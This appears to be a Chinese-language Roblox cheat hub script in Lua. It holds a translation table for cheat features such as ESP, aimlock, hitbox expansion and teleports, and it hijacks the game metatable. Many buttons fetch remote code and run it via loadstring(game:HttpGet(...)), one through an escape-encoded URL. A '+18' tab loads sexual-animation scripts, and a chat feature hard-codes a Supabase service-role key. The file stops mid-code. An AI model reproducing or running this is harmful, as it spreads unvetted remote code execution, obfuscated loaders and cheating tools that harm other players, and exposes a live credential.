["Bypass Rope"] = "绕过绳索",

["Auto Balance"] = "自动平衡",

["Press Speed"] = "按压速度",

["Randomize Press Speed"] = "随机按压速度",

["Pentathlon"] = "五项全能",

["Auto Ddakji"] = "自动翻牌",

["Auto Flying Stone"] = "自动飞石",

["Auto Gonggi"] = "自动抓石子",

["Gonggi QTE Speed"] = "抓石子QTE速度",

["Randomize QTE Speed"] = "随机QTE速度",

["Auto Spinning Top"] = "自动陀螺",

["Spinning Top Speed"] = "陀螺速度",

["Randomize Balance Speed"] = "随机平衡速度",

["Auto Jegi"] = "自动踢毽子",

["Key System"] = "密钥系统",

["Authentication"] = "验证",

["Enter Key"] = "输入密钥",

["Insert your key here"] = "在此输入你的密钥",

["Get Key (Linkvertise)"] = "获取密钥(Linkvertise)",

["Get Key (Work Ink)"] = "获取密钥(Work Ink)",

["Check Key"] = "检查密钥",

["Join Discord"] = "加入Discord",

["Copied To Clipboard: Ad Reward Link has been copied to your clipboard"] = "已复制到剪贴板：广告奖励链接已复制到你的剪贴板",

["Loader | AX-SCRIPTS"] = "加载器 | AX脚本",

["Ink Game | by AlexScriptX"] = "墨水游戏 | 作者AlexScriptX",

-- 第一波新增汉化

["Sky Squid Game"] = "天空鱿鱼游戏",

["Infinite Stamina"] = "无限体力",

["Press Button"] = "按下按钮",

["Get Pole"] = "获取杆子",

["Anti Fall"] = "防坠落",

["Void Kill"] = "虚空击杀",

["Tug of War"] = "拔河",

["Rope Pull Mode"] = "拉绳模式",

["Normal"] = "普通",

["Pull Rope"] = "拉绳子",

["Glass Bridge"] = "玻璃桥",

["Reveal Safe & Fake Glass"] = "显示真假玻璃",

["Anti Break Glass"] = "防玻璃破碎",

["Finish Glass Bridge"] = "完成玻璃桥",

["Hitbox + ESP"] = "碰撞箱+透视",

["Hitbox Size"] = "碰撞箱大小",

["Hitbox Transparency"] = "碰撞箱透明度",

["Last Dinner"] = "最后的晚餐",

["Safe Zone"] = "安全区",

["Zone Kill"] = "区域击杀",

["Squid Game"] = "鱿鱼游戏",

["Get Rock"] = "获取石头",

["Red Light, Green Light"] = "红灯绿灯",

["Auto Stop"] = "自动停止",

["Disable Injury"] = "禁用受伤",

["Finish RLGL"] = "完成红灯绿灯",

["Dalgona"] = "椪糖游戏",

["Anti Crack"] = "防碎裂",

["Get Lighter"] = "获取打火机",

["Auto Dalgona"] = "自动椪糖",

["Auto Dalgona V2"] = "自动椪糖二代",

["Teleport to Seeker"] = "传送到搜寻者处",

["Select Exit Door"] = "选择出口门",

["Teleport to Exit Door"] = "传送到出口门",

["Rebel"] = "反抗",

["Auto Shoot"] = "自动射击",

["Wall Check"] = "穿墙检测",

["Lights Out"] = "熄灯游戏",

["Hide N' Seek"] = "捉迷藏",

["Show Exit Doors (Yellow)"] = "显示出口门(黄色)",

["Show Doors (Green | Cir/Tri/Sqr)"] = "显示门(绿色|圆/三角/方)",

["Show Dropped Keys (Purple)"] = "显示掉落钥匙(紫色)",

["Show Staircases (Brown)"] = "显示楼梯(棕色)",

["Show Spikes (Black)"] = "显示尖刺(黑色)",

["Pickup Keys"] = "拾取钥匙",

["Auto Escape"] = "自动逃脱",

["Auto Dodge"] = "自动闪避",

["Fast Sprint"] = "快速冲刺",

["Spikes Kill"] = "尖刺击杀",

["Disable Spikes"] = "禁用尖刺",

["Teleport to Hider"] = "传送到躲藏者处",

-- 第二波新增汉化

["Troll"] = "恶搞",

["Manual"] = "手动",

["Perfect"] = "完美",

["Rage"] = "暴怒",

["Ultra Rage"] = "终极暴怒",

["PLEASE EXIT"] = "请退出",

-- 战斗界面第一波汉化

["Auto Attack"] = "自动攻击",

["Target"] = "目标",

["Closest"] = "最近",

["Whitelist"] = "白名单",

["Weapons to auto equip"] = "自动装备武器",

["Fork, Bottle, Pole, Kn.."] = "叉子、瓶子、杆子、刀..",

["Auto Attack Range"] = "自动攻击范围",

["Auto Equip Tool"] = "自动装备工具",

["Show Range"] = "显示范围",

["ESP Elements"] = "透视元素",

["Box Fill, Box Outline,.."] = "盒子填充、盒子轮廓..",

["Tracer Mode"] = "追踪线模式",

["Over Head"] = "头顶显示",

["Select Player"] = "选择玩家",

["ESP Distance"] = "透视距离",

["studs"] = "单位",

["ESP Performance Mode"] = "透视性能模式",

["Show Only My Team"] = "仅显示我的队伍",

["Show Only Enemy Team"] = "仅显示敌方队伍",

["Trail"] = "轨迹",

-- 战斗界面第二波汉化

["Aimlock"] = "自动锁头",

["Aimlock Mode"] = "锁头模式",

["LookingAt"] = "朝向目标",

["Teleport"] = "传送",

["Random"] = "随机",

["Quick Teleport"] = "快速传送",

["Facing"] = "朝向",

["HNS Mode"] = "捉迷藏模式",

["Attach"] = "附着",

["ESP"] = "透视",

["Enable ESP"] = "启用透视",

-- 混合文本优化汉化

["Teleport 目标 Mode"] = "传送目标模式",

["Teleport to 目标"] = "传送到目标",

["Face 目标"] = "朝向目标",

["Attach 目标"] = "附着目标",

["Select 目标 Player"] = "选择目标玩家",

["自动射击 Mode"] = "自动射击模式",

-- 杂项/防护/玩家/设置界面新增汉化

["Legit"] = "常规",

["Auto QTE"] = "自动QTE",

["Auto Skip Dialogue"] = "自动跳过对话",

["Auto Next Game"] = "自动下一局",

["Disable Effects"] = "禁用特效",

["Low GFX"] = "低配画质",

["Fullbright"] = "全亮模式",

["Pickup Bandages"] = "拾取绷带",

["FOV Changer"] = "视野修改器",

["Instant Interact"] = "即时交互",

["Lobby"] = "大厅",

["Enable VIP"] = "启用VIP",

["Glass Manufacturer Vision"] = "玻璃制造者视角",

["2x Vote Count"] = "双倍投票数",

["Custom Player Tag"] = "自定义玩家标签",

["Emote Pages"] = "表情页面",

["Private Server+"] = "私人服务器+",

["Permanent Guard"] = "永久守卫",

["Custom Player Tag (NOT FE)"] = "自定义玩家标签(非前端)",

["Set a custom tag"] = "设置自定义标签",

["Enter custom number"] = "输入自定义数字",

["Auto New Round"] = "自动新回合",

["Auto Return Lobby"] = "自动返回大厅",

["Auto Unlock Rewards"] = "自动解锁奖励",

["Player (NOT FE)"] = "玩家(非前端)",

["Noclip"] = "穿墙",

["Fly"] = "飞行",

["Anti Void"] = "防虚空",

["Hide Nametag"] = "隐藏名称标签",

["Hide Other Nametags"] = "隐藏其他玩家名称标签",

["Select Title"] = "选择头衔",

["AFK King"] = "挂机之王",

["Equip Title"] = "装备头衔",

["Custom Titles"] = "自定义头衔",

["Select Power"] = "选择能力",

["PARKOUR ARTIST"] = "跑酷大师",

["Equip Power"] = "装备能力",

["Disable Dash Cooldown"] = "禁用冲刺冷却",

["Parkour Artist Mods"] = "跑酷大师模组",

["Security"] = "安全",

["Anti AFK"] = "防挂机",

["Staff Detector"] = "管理员检测",

["Hitbox Expander"] = "碰撞箱扩展",

["反抗 Hitbox"] = "反抗碰撞箱",

["碰撞箱大小"] = "碰撞箱大小",

["碰撞箱透明度"] = "碰撞箱透明度",

["Utilities"] = "实用工具",

["Guard Shape"] = "守卫形状",

["Circle"] = "圆形",

["Spawn as Guard"] = "以守卫身份生成",

["Insta Claw Machine"] = "即时抓娃娃机",

["Insta Arcade (works outside the g"] = "即时街机(可在外部使用)",

["Guns"] = "枪械",

["Modded Guns"] = "改装枪械",

["自动射击 (Silent Aim)"] = "自动射击(静默瞄准)",

["Player Info"] = "玩家信息",

["Select a player to view info"] = "选择玩家查看信息",

["None"] = "无",

["Biggest Threat"] = "最大威胁",

["UI设置"] = "UI设置",

["Open Keybind Menu"] = "打开按键绑定菜单",

["Enable Crosshair"] = "启用准星",

["Lock Button (Mobile)"] = "锁定按钮(移动端)",

["Notification Side"] = "通知位置",

["Top-Right"] = "右上角",

["DPI Scale"] = "DPI缩放",

["100%"] = "100%",

["Menu bind"] = "菜单绑定键",

["Unload"] = "卸载",

["Configuration"] = "配置",

["Config name"] = "配置名称",

["Create config"] = "创建配置",

["Config list"] = "配置列表",

["Load config"] = "加载配置",

["Overwrite config"] = "覆盖配置",

["Delete config"] = "删除配置",

["Refresh list"] = "刷新列表",

["Set as autoload"] = "设为自动加载",

["Reset autoload"] = "重置自动加载",

["Current autoload config: none"] = "当前自动加载配置：无",

["Themes"] = "主题",

["Background color"] = "背景颜色",

["Main color"] = "主颜色",

["Accent color"] = "强调色",

["Outline color"] = "轮廓颜色",

["Font color"] = "字体颜色",

["Font Face"] = "字体",

["Gotham"] = "哥谭体",

["Theme list"] = "主题列表",

["Default"] = "默认",

["Set as default"] = "设为默认",

["Custom theme name"] = "自定义主题名称",

["Create theme"] = "创建主题",

["Custom themes"] = "自定义主题",

["Load theme"] = "加载主题",

["Overwrite theme"] = "覆盖主题",

["Delete theme"] = "删除主题",

["Reset default"] = "重置默认",

["Box Fill"] = "盒子填充",

["Box Outline"] = "盒子轮廓",

["Name"] = "名称",

["Tool"] = "工具",

["Studs"] = "单位",

["Health Number"] = "血量数值",

["Health Bar"] = "血条",

["Skeleton"] = "骨骼",

["Tracer"] = "追踪线"

}


local function translateText(text)

if not text or type(text) ~= "string" then return text end

if Translations[text] then

return Translations[text]

end

for en, cn in pairs(Translations) do

if text:find(en) then

return text:gsub(en, cn)

end

end

return text

end


local function setupTranslationEngine()

local success, err = pcall(function()

local oldIndex = getrawmetatable(game).__newindex

setreadonly(getrawmetatable(game), false)

getrawmetatable(game).__newindex = newcclosure(function(t, k, v)

if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then

v = translateText(tostring(v))

end

return oldIndex(t, k, v)

end)

setreadonly(getrawmetatable(game), true)

end)

if not success then

warn("元表劫持失败:", err)

local translated = {}

local function scanAndTranslate()

for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do

if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then

pcall(function()

local text = gui.Text

if text and text ~= "" then

local translatedText = translateText(text)

if translatedText ~= text then

gui.Text = translatedText

translated[gui] = true

end

end

end)

end

end

local player = game:GetService("Players").LocalPlayer

if player and player:FindFirstChild("PlayerGui") then

for _, gui in ipairs(player.PlayerGui:GetDescendants()) do

if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then

pcall(function()

local text = gui.Text

if text and text ~= "" then

local translatedText = translateText(text)

if translatedText ~= text then

gui.Text = translatedText

translated[gui] = true

end

end

end)

end

end

end

end

local function setupDescendantListener(parent)

parent.DescendantAdded:Connect(function(descendant)

if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then

task.wait(0.1)

pcall(function()

local text = descendant.Text

if text and text ~= "" then

local translatedText = translateText(text)

if translatedText ~= text then

descendant.Text = translatedText

end

end

end)

end

end)

end

pcall(setupDescendantListener, game:GetService("CoreGui"))

local player = game:GetService("Players").LocalPlayer

if player and player:FindFirstChild("PlayerGui") then

pcall(setupDescendantListener, player.PlayerGui)

end

while true do

scanAndTranslate()

task.wait(3)

end

end

end


task.wait(2)


setupTranslationEngine()


local success, err = pcall(function()

--这下面填加载外部脚本


loadstring(game:HttpGet("https://officialaxscripts.vercel.app/scripts/AX-Loader.lua"))()


end)


if not success then

warn("加载失败:", err)

end


end})


-- 汉化功能模块 (放在脚本开头)

local TranslationModule = {}


-- 初始化变量

local HttpService = game:GetService("HttpService")

local Players = game:GetService("Players")

local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

local playerGui = player:WaitForChild("PlayerGui")

local CoreGui = game:GetService("CoreGui")


local TARGET_LANGUAGE = "zh-CN"

local SCAN_INTERVAL = 2 -- 默认2秒

local MAX_TEXT_LENGTH = 500


local translatedCache = {}

local translatedObjects = {}

local isTranslationEnabled = false

local connection = nil


-- 危险指令列表

local DANGEROUS_COMMANDS = {

"neon", "shine", "ghost", "gold", "spin", 

"bighead", "smallhead", "giantdwarf", "squash"

}


-- 语言检测模式

local LANGUAGE_PATTERNS = {

["zh-CN"] = {

pattern = "[\199-\244][\128-\191]*[\128-\191]",

exclude = "[\227][\128-\191][\128-\191]"

},

["zh-TW"] = {

pattern = "[\227][\128-\191][\128-\191]"

},

["ja"] = {

pattern = "[\123-\125]|[\199-\244][\128-\191]*[\128-\191]",

exclude = "[\199-\244][\128-\191]*[\128-\191]"

},

["ko"] = {

pattern = "[\234-\235][\128-\191][\128-\191]|[\236-\237][\128-\191][\128-\191]"

},

["ar"] = {

pattern = "[\216-\219][\128-\191]"

},

["ru"] = {

pattern = "[\208-\209][\128-\191]"

},

["th"] = {

pattern = "[\224-\231][\128-\191]"

},

["en"] = {

pattern = "[A-Za-z]",

exclude = "[\199-\244][\128-\191]*[\128-\191]"

}

}


-- 检查是否为危险文本

local function isDangerousText(text)

if not text or type(text) ~= "string" then return false end

local lowerText = text:lower()

for _, cmd in ipairs(DANGEROUS_COMMANDS) do

if lowerText:find(cmd) then

return true

end

end

return false

end


-- 检查是否需要跳过翻译

local function shouldSkipTranslation(text)

if not text or text == "" or translatedCache[text] then

return true

end

if text:match("^%s*$") or 

text:match("^[0-9%.%s,:/]+$") or 

#text > MAX_TEXT_LENGTH or

isDangerousText(text) then

translatedCache[text] = text

return true

end

return false

end


-- 增强的语言检测函数

local function detectLanguage(text)

if not text or type(text) ~= "string" or text == "" then

return "en"

end

if text:match(LANGUAGE_PATTERNS["zh-CN"].pattern) and 

(not LANGUAGE_PATTERNS["zh-CN"].exclude or not text:match(LANGUAGE_PATTERNS["zh-CN"].exclude)) then

return "zh-CN"

end

if text:match(LANGUAGE_PATTERNS["zh-TW"].pattern) then

return "zh-TW"

end

if text:match(LANGUAGE_PATTERNS["ja"].pattern) and 

(not LANGUAGE_PATTERNS["ja"].exclude or not text:match(LANGUAGE_PATTERNS["ja"].exclude)) then

return "ja"

end

if text:match(LANGUAGE_PATTERNS["ko"].pattern) then

return "ko"

end

if text:match(LANGUAGE_PATTERNS["ar"].pattern) then

return "ar"

end

if text:match(LANGUAGE_PATTERNS["ru"].pattern) then

return "ru"

end

if text:match(LANGUAGE_PATTERNS["th"].pattern) then

return "th"

end

return "en"

end


-- 翻译函数

local function translate(text)

if shouldSkipTranslation(text) then

return translatedCache[text] or text

end


local sourceLang = detectLanguage(text)

if sourceLang == "zh-CN" or sourceLang == "zh-TW" then

translatedCache[text] = text

return text

end


local function tryAlternativeAPI()

local success, response = pcall(function()

return game:HttpGet(

("https://api.mymemory.translated.net/get?q=%s&langpair=%s|%s")

:format(HttpService:UrlEncode(text), sourceLang, TARGET_LANGUAGE)

)

end)

if success and response then

local ok, data = pcall(HttpService.JSONDecode, HttpService, response)

if ok and data and data.responseData and data.responseData.translatedText then

return data.responseData.translatedText

end

end

return nil

end


local success, response = pcall(function()

return game:HttpGet(

("https://translate.googleapis.com/translate_a/single?client=gtx&sl=%s&tl=%s&dt=t&q=%s")

:format(sourceLang, TARGET_LANGUAGE, HttpService:UrlEncode(text))

)

end)


if success and response then

local ok, data = pcall(HttpService.JSONDecode, HttpService, response)

if ok and data and data[1] then

local translatedText = ""

for _, segment in ipairs(data[1]) do

if segment[1] then

translatedText = translatedText .. segment[1]

end

end

if translatedText ~= "" and translatedText ~= text then

translatedCache[text] = translatedText

return translatedText

end

end

end


local altTranslation = tryAlternativeAPI()

if altTranslation then

translatedCache[text] = altTranslation

return altTranslation

end


translatedCache[text] = text

return text

end


-- 检查UI元素是否有文本内容

local function hasTextContent(gui)

if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then

return gui.Text and gui.Text ~= ""

elseif gui:IsA("ImageButton") or gui:IsA("ImageLabel") then

return gui:GetAttribute("Text") or gui.Name ~= ""

end

return false

end


-- 获取UI元素的文本内容

local function getTextContent(gui)

if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then

return gui.Text

elseif gui:IsA("ImageButton") or gui:IsA("ImageLabel") then

return gui:GetAttribute("Text") or gui.Name

end

return nil

end


-- 设置UI元素的文本内容

local function setTextContent(gui, text)

if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then

gui.Text = text

elseif gui:IsA("ImageButton") or gui:IsA("ImageLabel") then

gui:SetAttribute("OriginalText", getTextContent(gui))

gui:SetAttribute("Text", text)

end

end


-- 扫描并翻译UI元素

local function scanAndTranslate()

local count = 0

for _, gui in ipairs(playerGui:GetDescendants()) do

if not translatedObjects[gui] and hasTextContent(gui) then

local text = getTextContent(gui)

if text and text ~= "" then

translatedObjects[gui] = true

local translatedText = translate(text)

if getTextContent(gui) == text then

setTextContent(gui, translatedText)

count = count + 1

end

end

end

end

for _, gui in ipairs(CoreGui:GetDescendants()) do

if not translatedObjects[gui] and hasTextContent(gui) then

local text = getTextContent(gui)

if text and text ~= "" then

translatedObjects[gui] = true

local translatedText = translate(text)

if getTextContent(gui) == text then

setTextContent(gui, translatedText)

count = count + 1

end

end

end

end

return count

end


-- 重启自动扫描（当速度改变时调用）

local function restartAutoScan()

if isTranslationEnabled then

-- 先关闭现有连接

if connection then

connection:Disconnect()

connection = nil

end

-- 重新开启

TranslationModule.enableAutoTranslate(true)

end

end


-- 公共API函数

function TranslationModule.enableAutoTranslate(enabled)

isTranslationEnabled = enabled

if enabled then

if connection then

connection:Disconnect()

connection = nil

end

-- 立即扫描一次

scanAndTranslate()

connection = RunService.Heartbeat:Connect(function()

if isTranslationEnabled then

scanAndTranslate()

task.wait(SCAN_INTERVAL)

end

end)

else

if connection then

connection:Disconnect()

connection = nil

end

end

end


function TranslationModule.scanNow()

local count = scanAndTranslate()

return count

end


function TranslationModule.clearCache()

translatedCache = {}

translatedObjects = {}

end


function TranslationModule.setScanInterval(seconds)

SCAN_INTERVAL = seconds

-- 如果自动翻译已开启，重启扫描以应用新间隔

restartAutoScan()

end


-- ============================================

-- 以下是放在你提供的控件里的代码

-- ============================================


-- 1. Paragraph (用于显示说明)

local Paragraph = Tab3:AddParagraph({"汉化功能", "自动翻译游戏界面文本为简体中文\n默认扫描间隔: 2秒"})


-- 2. Toggle (自动翻译开关)

Tab3:AddToggle({

Name = "自动翻译",

Default = false,

Callback = function(v)

TranslationModule.enableAutoTranslate(v)

end

})


-- 3. Slider (速度调节) - 改为1-100范围

Tab3:AddSlider({

Name = "扫描速度 (1-100)",

Min = 1,

Max = 100,

Increase = 1,

Default = 20, -- 对应原来的2秒 (100/50 = 2)

Callback = function(Value)

-- 将1-100映射到扫描间隔（例如：1=最快, 100=最慢）

-- 这里可以让1对应0.5秒，100对应10秒，或者根据你的需求调整

local interval = 0.5 + (Value / 100) * 9.5 -- 范围: 0.5秒 到 10秒

TranslationModule.setScanInterval(interval)

end

})


-- 4. Button (手动扫描)

Tab3:AddButton({

Name = "立即扫描翻译",

Callback = function(Value)

TranslationModule.scanNow()

end

})


-- 5. Button (清空缓存)

Tab3:AddButton({

Name = "清空翻译缓存",

Callback = function(Value)

TranslationModule.clearCache()

end

})


Tab4:AddButton({"鲨脚本", function(Value)

loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\65\51\78\113\122\52\78\112\47\114\97\119"))()

end})


Tab4:AddButton({"Katchi Hub2.1 无卡密", function(Value)

loadstring(game:HttpGet("https://raw.githubusercontent.com/XaviscoZ/roblox/refs/heads/main/g%26b.lua"))()

end})


Tab4:AddButton({"老外脚本 有卡密", function(Value)

loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))()

end})


Tab4:AddButton({"Katchi Hub5.2 有卡 有飞行", function(Value)

loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/716e6083239381ecd8b1f0591e383b2005a6fd5d87ede30645fac4f53e764d4a/download"))()

end})

        WindUI:Notify({
            Title = "已加载",
            Content = "感谢使用",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "🚫+18区",
    Icon = "circle-slash",
    Locked = false,
    Opened = true,
})

local Button = Tab:Button({
    Title = "r6录关",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
        WindUI:Notify({
            Title = "🐔绑好爽",
            Content = "🥵",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r15录关",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
        WindUI:Notify({
            Title = "几磅好爽",
            Content = "🥵",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "操人GUI",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
        WindUI:Notify({
            Title = "别人🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6被操",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/r6%E8%A2%AB%E6%93%8D.txt"))()
        WindUI:Notify({
            Title = "你🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r15被操",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/%E8%A2%AB%E6%93%8DR15.txt"))()
        WindUI:Notify({
            Title = "你🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6让别人给你口",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R6%E8%AE%A9%E5%88%AB%E4%BA%BA%E7%BB%99%E4%BD%A0%E5%8F%A3.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R15让别人给你口",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R15%E8%AE%A9%E5%88%AB%E4%BA%BA%E7%BB%99%E4%BD%A0%E5%8F%A3.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6口别人",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R6%E8%B5%A4%E5%A3%81%E6%88%96%E9%B8%A1.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R15口别人",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R15%E8%B5%A4%E5%A3%81%E6%88%96%E9%9B%86.txt"))()
        WindUI:Notify({
            Title = "口🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "R6后入",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R6%E5%90%8E%E5%85%A5.txt"))()
        WindUI:Notify({
            Title = "入🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Button = Tab:Button({
    Title = "r15后入",
    Desc = "",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/R15%E5%90%8E%E5%85%A5.txt"))()
        WindUI:Notify({
            Title = "入🥵",
            Content = "",
            Icon = "crown",
            Duration = 3
        })
    end
})

-- 创建音乐页签
local MusicTab = Window:Tab({
    Title = "音乐播放器",
    Icon = "music",
    Locked = false,
    Opened = false,
})

-- 初始化音源
local SoundService = game:GetService("SoundService")
local BackgroundMusic = SoundService:FindFirstChild("ScriptMusic")

if not BackgroundMusic then
    BackgroundMusic = Instance.new("Sound")
    BackgroundMusic.Name = "ScriptMusic"
    BackgroundMusic.Parent = SoundService
end

-- 1. 音乐 ID 输入
MusicTab:Input({
    Title = "输入音乐 ID",
    Desc = "输入数字 ID 即可自动加载",
    Value = "",
    InputIcon = "audio-lines",
    Type = "Input",
    Placeholder = "例如: 1837874530",
    Callback = function(input) 
        local cleanId = input:match("%d+")
        if cleanId then
            BackgroundMusic.SoundId = "rbxassetid://" .. cleanId
        end
    end
})

-- 2. 播放控制
MusicTab:Button({
    Title = "开始播放",
    Desc = "播放选定的音轨",
    Callback = function()
        if BackgroundMusic.SoundId ~= "" then
            BackgroundMusic:Play()
        end
    end
})

MusicTab:Button({
    Title = "停止播放",
    Desc = "停止当前音频",
    Callback = function()
        BackgroundMusic:Stop()
    end
})

MusicTab:Toggle({
    Title = "循环模式",
    Desc = "开启后自动重播",
    Default = false,
    Callback = function(state)
        BackgroundMusic.Looped = state
    end
})


local Tab = Window:Tab({
    Title = "黑白脚本",
    Icon = "crown",
    Locked = false,
    Opened = true,
})

local Section = Tab:Section({ 
    Title = "--------------下面是遗照脚本--------------",
    TextXAlignment = "Center",
    TextSize = 17
})

local Button = Tab:Button({
    Title = "黑白脚本",
    Desc = "给遗照脚本单开一栏",
    Locked = false,
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/tfcygvunbind/Apple/main/黑白脚本加载器'))()
        WindUI:Notify({
            Title = "🐔榜",
            Content = "黑照脚本",
            Icon = "crown",
            Duration = 3
        })
    end
})

local Tab = Window:Tab({
    Title = "通用",
    Icon = "play",
    Locked = false,
})

local Button = Tab:Button({
    Title = "全球聊天",
    Desc = "调用API让使用脚本的人互相聊天",
    Locked = false,
    Callback = function()
        local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- === 配置信息 ===
local SB_URL = "https://ybgteridcrtoulzcxyfl.supabase.co"
local SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InliZ3RlcmlkY3J0b3VsemN4eWZsIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NTY1MDA5MCwiZXhwIjoyMDkxMjI2MDkwfQ.XnYrYgSGEZ8MkT-Q1ZMSsnHglEJN8E0EY7qACkrZSB0"

-- 清理旧UI
if player.PlayerGui:FindFirstChild("LiuMouChat") then
    player.PlayerGui.LiuMouChat:Destroy()
end

local ScreenGui = Instance.new("ScreenGui", player.PlayerGui)
ScreenGui.Name = "LiuMouChat"
ScreenGui.ResetOnSpawn = false

-- === 彩虹底层 (负责边框和拖动) ===
local Background = Instance.new("Frame")
Background.Name = "Background"
Background.Size = UDim2.new(0, 224, 0, 264)
Background.Position = UDim2.new(0.5, -112, 0.4, -132)
Background.BackgroundColor3 = Color3.new(1, 1, 1)
Background.BorderSizePixel = 0
Background.Active = true 
Background.Parent = ScreenGui

local BGCorner = Instance.new("UICorner", Background)
BGCorner.CornerRadius = UDim.new(0, 10)

local Gradient = Instance.new("UIGradient")
Gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.new(1, 0, 0)),
    ColorSequenceKeypoint.new(0.2, Color3.new(1, 1, 0)),
    ColorSequenceKeypoint.new(0.4, Color3.new(0, 1, 0)),
    ColorSequenceKeypoint.new(0.6, Color3.new(0, 1, 1)),
    ColorSequenceKeypoint.new(0.8, Color3.new(0, 0, 1)),
    ColorSequenceKeypoint.new(1, Color3.new(1, 0, 1))
})
Gradient.Parent = Background

-- 彩虹旋转动画
task.spawn(function()
    while Background do
        Gradient.Rotation = Gradient.Rotation + 3
        task.wait(0.03)
    end
end)

-- === 内容主面板 ===
local Main = Instance.new("Frame", Background)
Main.Name = "Main"
Main.Size = UDim2.new(0, 220, 0, 260)
Main.Position = UDim2.new(0.5, -110, 0.5, -130)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0
Main.ZIndex = 2
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 8)

-- === 标题：刘某全球聊天系统 ===
local Title = Instance.new("TextLabel", Main)
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Text = "刘某全球聊天系统"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.ZIndex = 3

-- 关闭按钮
local Close = Instance.new("TextButton", Main)
Close.Size = UDim2.new(0, 25, 0, 25)
Close.Position = UDim2.new(1, -30, 0, 5)
Close.Text = "×"
Close.TextColor3 = Color3.new(1, 1, 1)
Close.BackgroundTransparency = 1
Close.TextSize = 24
Close.ZIndex = 4
Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- 聊天内容显示
local Scroll = Instance.new("ScrollingFrame", Main)
Scroll.Size = UDim2.new(0.9, 0, 0.6, 0)
Scroll.Position = UDim2.new(0.05, 0, 0.15, 0)
Scroll.BackgroundTransparency = 1
Scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
Scroll.ScrollBarThickness = 1
Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
Scroll.ZIndex = 3
Scroll.Parent = Main

local Layout = Instance.new("UIListLayout", Scroll)
Layout.Padding = UDim.new(0, 4)

-- 输入框
local Input = Instance.new("TextBox", Main)
Input.Size = UDim2.new(0.85, 0, 0, 32)
Input.Position = UDim2.new(0.075, 0, 0.82, 0)
Input.PlaceholderText = "输入聊天内容..."
Input.Text = ""
Input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
